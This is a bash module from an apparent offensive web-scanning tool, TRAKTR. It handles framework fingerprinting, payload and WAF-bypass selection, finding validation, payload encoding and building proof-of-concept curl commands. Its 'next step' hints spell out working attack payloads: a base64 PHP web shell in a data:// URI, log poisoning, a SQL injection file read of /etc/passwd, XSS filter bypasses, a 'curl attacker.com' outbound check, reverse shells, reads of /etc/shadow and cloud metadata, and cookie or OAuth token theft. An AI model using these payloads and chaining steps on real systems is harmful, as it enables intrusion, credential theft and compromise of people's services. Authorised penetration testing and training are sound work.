#!/usr/bin/env bash
# TRAKTR Intelligence Brain v1.0
# Framework detection, payload selection, multi-signal validation, chaining
# Usage: source brain.sh (sourced by traktr.sh)

# ═══════════════════════════════════════════════════════════════════════════
#  FRAMEWORK DETECTION
# ═══════════════════════════════════════════════════════════════════════════
detect_framework() {
  local headers="${1:-}" body="${2:-}"
  local result="generic"

  # Header-based detection (most reliable)
  local powered; powered=$(echo "$headers" | grep -oiP 'x-powered-by:\s*\K.*' | head -1 | xargs) || true
  local server; server=$(echo "$headers" | grep -oiP 'server:\s*\K.*' | head -1 | xargs) || true
  local cookies; cookies=$(echo "$headers" | grep -oi 'set-cookie:.*') || true

  # PHP frameworks
  if echo "$powered" | grep -qi 'php'; then
    result="php"
    echo "$body" | grep -q 'wp-content\|wp-includes\|wp-json\|wp-login' && result="wordpress"
    echo "$cookies" | grep -qi 'laravel_session' && result="laravel"
    echo "$body" | grep -q 'Drupal\|drupal.js' && result="drupal"
    echo "$body" | grep -q 'Joomla\|/administrator/' && result="joomla"
  # Node/Express
  elif echo "$powered" | grep -qi 'express'; then
    result="express"
  # ASP.NET
  elif echo "$powered" | grep -qi 'asp\.net\|asp.net'; then
    result="aspnet"
  fi

  # Cookie-based detection (overrides header if more specific)
  echo "$cookies" | grep -qi 'JSESSIONID\|PHPSESSID\|jsessionid' && {
    echo "$cookies" | grep -qi 'JSESSIONID' && result="spring"
    echo "$cookies" | grep -qi 'PHPSESSID' && [[ "$result" == "generic" ]] && result="php"
  } || true
  echo "$cookies" | grep -qi '_rails\|_session_id.*=' && result="rails" || true
  echo "$cookies" | grep -qi 'laravel_session' && result="laravel" || true
  echo "$cookies" | grep -qi 'connect\.sid' && result="express" || true

  # Body-based detection (least reliable, use as tiebreaker)
  if [[ "$result" == "generic" ]]; then
    echo "$body" | grep -q 'csrfmiddlewaretoken' && result="django"
    echo "$body" | grep -q '__VIEWSTATE\|__EVENTVALIDATION' && result="aspnet"
    echo "$body" | grep -q '__NEXT_DATA__\|_next/static' && result="nextjs"
    echo "$body" | grep -q 'ng-app\|ng-controller\|angular\.module' && result="angular"
    echo "$body" | grep -q '__nuxt\|nuxt\.js' && result="nuxtjs"
    echo "$body" | grep -q 'data-reactroot\|__REACT' && result="react"
    echo "$body" | grep -q 'Symfony\|sf-toolbar' && result="symfony"
    echo "$body" | grep -q 'Flask\|Werkzeug' && result="flask"
    echo "$body" | grep -q 'gin-gonic\|X-Request-Id' && result="gin" # Go
    echo "$body" | grep -q 'phx-\|Phoenix' && result="phoenix" # Elixir
    # PHP detection via .php links in body (common when no X-Powered-By header)
    echo "$body" | grep -qP 'href=["\x27][^"]*\.php["\x27?]|action=["\x27][^"]*\.php["\x27]' && result="php"
  fi || true

  echo "$result"
}

# ═══════════════════════════════════════════════════════════════════════════
#  PAYLOAD SELECTION
# ═══════════════════════════════════════════════════════════════════════════
select_payloads() {
  local vuln_type="${1:-lfi}" framework="${2:-generic}" waf="${3:-none}"
  local root="${TRAKTR_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)}"
  local oscp="${OSCP:-false}"
  local files=()

  # Base payloads for vuln type
  for f in "$root/payloads/${vuln_type}"/*.txt; do
    [[ -f "$f" ]] && files+=("$f")
  done
  # Also follow symlinks
  for f in "$root/payloads/${vuln_type}"/*; do
    [[ -d "$f" ]] && for sf in "$f"/*.txt; do [[ -f "$sf" ]] && files+=("$sf"); done
  done

  # Framework-specific payloads
  local fw_file="$root/payloads/framework/${framework}_${vuln_type}.txt"
  [[ -f "$fw_file" ]] && files=("$fw_file" "${files[@]}")

  # If WAF detected, add evasion payloads
  if [[ "$waf" != "none" ]]; then
    local waf_file="$root/payloads/waf_bypass/${waf}_${vuln_type}.txt"
    [[ -f "$waf_file" ]] && files+=("$waf_file")
    # Generic WAF bypass
    for f in "$root/payloads/waf_bypass"/*.txt; do
      [[ -f "$f" ]] && files+=("$f")
    done
  fi

  # OSCP mode: filter out destructive payloads
  if [[ "$oscp" == true ]]; then
    local safe_files=()
    for f in "${files[@]}"; do
      if ! head -5 "$f" | grep -q '#DESTRUCTIVE'; then
        safe_files+=("$f")
      fi
    done
    files=("${safe_files[@]+"${safe_files[@]}"}")
  fi

  printf '%s\n' "${files[@]+"${files[@]}"}"
}

# ═══════════════════════════════════════════════════════════════════════════
#  MULTI-SIGNAL FINDING VALIDATION
# ═══════════════════════════════════════════════════════════════════════════
# Signature banks per vuln type
declare -gA VULN_SIGNATURES=(
  [lfi]='root:x:0:|root:\*:0:|\[extensions\]|\[fonts\]|boot loader|PD9waH|<\?php|/usr/sbin|/bin/bash|/bin/sh|DOCUMENT_ROOT=|HTTP_HOST='
  [sqli]='SQL syntax|mysql_fetch|ORA-01756|ORA-00933|SQLSTATE|syntax error|Unclosed quotation|pg_query|sqlite3|microsoft.*odbc|JDBC|unterminated|quoted string not properly terminated'
  [xss]='' # XSS validation is: exact reflected payload match
  [rce]='uid=[0-9]|root:x:0|www-data|TRAKTR_RCE_CANARY|total [0-9]|drwx|Linux version'
  [ssrf]='169\.254\.169\.254|metadata|compute\.internal|localhost|127\.0\.0\.'
)

validate_finding() {
  local url="$1" param="$2" vuln_type="$3"
  local resp_file="$4" baseline_file="$5"
  local resp_status="${6:-200}" baseline_status="${7:-200}"
  local resp_time="${8:-0}" baseline_time="${9:-0}"

  local signals=0
  local signal_names=""

  # Signal 1: CONTENT_MATCH -- response contains known vuln signature
  local sigs="${VULN_SIGNATURES[$vuln_type]:-}"
  if [[ -n "$sigs" ]] && [[ -f "$resp_file" ]]; then
    if grep -qP "$sigs" "$resp_file" 2>/dev/null; then
      ((signals++)) || true
      signal_names+="content_match,"
    fi
  fi

  # Signal 2: LENGTH_DELTA -- significant size difference from baseline
  if [[ -f "$resp_file" ]] && [[ -f "$baseline_file" ]]; then
    local resp_size baseline_size delta
    resp_size=$(wc -c < "$resp_file" 2>/dev/null || echo 0)
    baseline_size=$(wc -c < "$baseline_file" 2>/dev/null || echo 0)
    delta=$(( resp_size - baseline_size ))
    if [[ ${delta#-} -gt 200 ]]; then
      ((signals++)) || true
      signal_names+="length_delta(${delta}),"
    fi
  fi

  # Signal 3: STATUS_CHANGE -- HTTP status differs from baseline
  if [[ "$resp_status" != "$baseline_status" ]]; then
    ((signals++)) || true
    signal_names+="status_change(${baseline_status}->${resp_status}),"
  fi

  # Signal 4: TIME_DELTA -- response significantly slower (blind/time-based)
  if [[ -n "$resp_time" ]] && [[ -n "$baseline_time" ]]; then
    local time_ratio
    time_ratio=$(awk "BEGIN{if($baseline_time>0) printf \"%.1f\", $resp_time/$baseline_time; else print 0}" 2>/dev/null) || true
    if awk "BEGIN{exit !($time_ratio >= 2.0)}" 2>/dev/null; then
      ((signals++)) || true
      signal_names+="time_delta(${time_ratio}x),"
    fi
  fi

  # Signal 5: HEADER_CHANGE -- new debug/error headers appeared
  # (Would need header files; skip if not provided -- handled in caller)

  # Scoring
  local confidence="FALSE_POSITIVE"
  if [[ $signals -ge 3 ]]; then
    confidence="HIGH"
  elif [[ $signals -ge 2 ]]; then
    confidence="MEDIUM"
  elif [[ $signals -ge 1 ]]; then
    confidence="LOW"
  fi

  # Remove trailing comma
  signal_names="${signal_names%,}"

  echo "${confidence}|${signals}|${signal_names}"
}

# ═══════════════════════════════════════════════════════════════════════════
#  NEXT STEP SUGGESTIONS (vuln chaining)
# ═══════════════════════════════════════════════════════════════════════════
suggest_next_step() {
  local vuln_type="$1" framework="${2:-generic}" detail="${3:-}"

  case "$vuln_type" in
    lfi)
      echo "Manual next steps:"
      echo "  1. Read sensitive files: /etc/shadow, /etc/hostname, /proc/self/cmdline"
      echo "  2. Read app source: index.php, config.php, .env, web.config"
      if [[ "$framework" == "php" ]] || [[ "$framework" == "laravel" ]] || [[ "$framework" == "wordpress" ]]; then
        echo "  3. PHP wrappers: php://filter/convert.base64-encode/resource=index"
        echo "  4. data:// for RCE: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
        echo "  5. Log poisoning: poison /var/log/apache2/access.log via User-Agent, then include it"
      fi
      if [[ "$framework" == "spring" ]] || [[ "$framework" == "generic" ]]; then
        echo "  3. Java: WEB-INF/web.xml, /META-INF/MANIFEST.MF, application.properties"
      fi
      echo "  6. /proc/self/environ for env vars, /proc/self/fd/[0-9] for open files"
      ;;
    sqli)
      echo "Manual next steps:"
      echo "  1. Confirm injection type: UNION, error-based, blind, time-based"
      echo "  2. Enumerate: databases, tables, columns (sqlmap --batch --dbs)"
      echo "  3. Check stacked queries: ; SELECT sleep(5)--"
      echo "  4. Try file read: ' UNION SELECT load_file('/etc/passwd')--"
      echo "  5. Try out-of-band: DNS exfil if blind"
      ;;
    xss)
      echo "Manual next steps:"
      echo "  1. Test stored XSS (submit payload, check if persists)"
      echo "  2. Check CSP headers: curl -sI target | grep -i content-security"
      echo "  3. Try DOM-based: check URL fragments, document.location sinks"
      echo "  4. Escalate: cookie theft, session hijack, keylogging"
      echo "  5. Test filter bypass: <svg/onload=alert(1)>, <img src=x onerror=alert(1)>"
      ;;
    rce)
      echo "Manual next steps:"
      echo "  1. Confirm with time-based: sleep 5 / ping -c 5 127.0.0.1"
      echo "  2. Read /etc/passwd to confirm execution context"
      echo "  3. Check for outbound: curl attacker.com/canary or nslookup"
      echo "  4. OSCP: manual reverse shell only (nc, bash, python)"
      echo "  5. Enumerate: whoami, id, uname -a, ifconfig/ip addr"
      ;;
    ssrf)
      echo "Manual next steps:"
      echo "  1. Access cloud metadata: http://169.254.169.254/latest/meta-data/"
      echo "  2. Port scan internal: http://127.0.0.1:PORT, http://10.0.0.1:PORT"
      echo "  3. Read internal files: file:///etc/passwd (if protocol supported)"
      echo "  4. Access internal services: Redis (6379), Elasticsearch (9200), Memcached (11211)"
      echo "  5. Try gopher:// or dict:// for protocol smuggling"
      ;;
    open_redirect)
      echo "Manual next steps:"
      echo "  1. Chain with XSS via javascript: pseudo-protocol"
      echo "  2. Use for OAuth token theft (redirect_uri manipulation)"
      echo "  3. Phishing: craft convincing URL with legitimate domain"
      echo "  4. Test SSRF: redirect to internal IP/metadata endpoint"
      ;;
    auth_bypass)
      echo "Manual next steps:"
      echo "  1. Test IDOR: change user/resource IDs in other endpoints"
      echo "  2. Privilege escalation: access admin endpoints with low-priv token"
      echo "  3. Test mass assignment: add role=admin to registration/update"
      echo "  4. JWT manipulation: change alg to none, modify claims"
      ;;
    *)
      echo "Manual verification recommended. Review findings.json for details."
      ;;
  esac
}

# ═══════════════════════════════════════════════════════════════════════════
#  PAYLOAD ENCODING
# ═══════════════════════════════════════════════════════════════════════════
encode_payload() {
  local payload="$1" encoding="${2:-url}"

  case "$encoding" in
    url)
      python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))" 2>/dev/null || \
        echo "$payload" | sed 's/%/%25/g; s/ /%20/g; s/!/%21/g; s/"/%22/g; s/#/%23/g; s/\$/%24/g; s/&/%26/g; s/'"'"'/%27/g; s/(/%28/g; s/)/%29/g; s/\*/%2A/g; s/+/%2B/g; s/,/%2C/g; s/\//%2F/g; s/:/%3A/g; s/;/%3B/g; s/</%3C/g; s/=/%3D/g; s/>/%3E/g; s/?/%3F/g; s/@/%40/g'
      ;;
    double-url)
      local first; first=$(encode_payload "$payload" url)
      encode_payload "$first" url
      ;;
    base64)
      echo -n "$payload" | base64 -w0 2>/dev/null || echo -n "$payload" | base64
      ;;
    hex)
      echo -n "$payload" | xxd -p | tr -d '\n'
      ;;
    unicode)
      echo -n "$payload" | while IFS= read -r -n1 char; do
        printf '%%u00%02x' "'$char" 2>/dev/null || printf '%s' "$char"
      done
      ;;
    html-entity)
      echo -n "$payload" | while IFS= read -r -n1 char; do
        printf '&#x%02x;' "'$char" 2>/dev/null || printf '%s' "$char"
      done
      ;;
    null-byte)
      echo -n "${payload}%00"
      ;;
    *)
      echo "$payload"
      ;;
  esac
}

# ═══════════════════════════════════════════════════════════════════════════
#  CURL COMMAND BUILDER (for PoC output)
# ═══════════════════════════════════════════════════════════════════════════
build_curl_command() {
  local url="$1" method="${2:-GET}" payload_param="${3:-}" payload_value="${4:-}"
  local cmd="curl -sk"

  # Method
  [[ "$method" != "GET" ]] && cmd+=" -X $method"

  # Auth headers from global state
  [[ -n "${AUTH_BASIC:-}" ]] && cmd+=" -u '${AUTH_BASIC}'"
  [[ -n "${BEARER_TOKEN:-}" ]] && cmd+=" -H 'Authorization: Bearer ${BEARER_TOKEN}'"
  [[ -n "${CUSTOM_COOKIES:-}" ]] && cmd+=" -H 'Cookie: ${CUSTOM_COOKIES}'"
  for h in "${CUSTOM_HEADERS[@]+"${CUSTOM_HEADERS[@]}"}"; do
    [[ -n "$h" ]] && cmd+=" -H '$h'"
  done

  # Burp headers
  if [[ -n "${REQUEST_FILE:-}" ]] && [[ ${#BURP_HEADERS[@]} -gt 0 ]] 2>/dev/null; then
    for hdr in "${!BURP_HEADERS[@]}"; do
      [[ "$hdr" == "Host" ]] || [[ "$hdr" == "Content-Length" ]] && continue
      cmd+=" -H '${hdr}: ${BURP_HEADERS[$hdr]}'"
    done
  fi

  # Inject payload into URL or body
  if [[ -n "$payload_param" ]] && [[ -n "$payload_value" ]]; then
    local enc_val; enc_val=$(encode_payload "$payload_value" url)
    if [[ "$method" == "GET" ]]; then
      cmd+=" '${url}?${payload_param}=${enc_val}'"
    else
      cmd+=" -d '${payload_param}=${enc_val}' '${url}'"
    fi
  else
    cmd+=" '${url}'"
  fi

  echo "$cmd"
}
